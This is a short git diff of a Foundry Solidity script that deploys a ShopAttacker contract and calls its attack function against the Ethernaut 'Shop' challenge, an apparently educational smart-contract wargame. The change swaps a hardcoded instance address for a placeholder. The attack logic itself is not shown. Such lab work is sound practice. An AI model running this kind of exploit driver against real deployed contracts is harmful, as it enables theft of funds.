@@ -5,14 +5,11 @@ import "forge-std/Script.sol";
 import "../src/Ethernaut Challenge/21_Shop.sol";
 
 contract ExploitScript is Script {
-        
 
     function run() external {
         vm.startBroadcast();
-
-        ShopAttacker shopAttacker = new ShopAttacker(0xf52480978f3CE7bCEBe4a7504c111a426544ED63);
+        ShopAttacker shopAttacker = new ShopAttacker(your_challenge_address);
         shopAttacker.attack();
-
         vm.stopBroadcast();
     }
 }
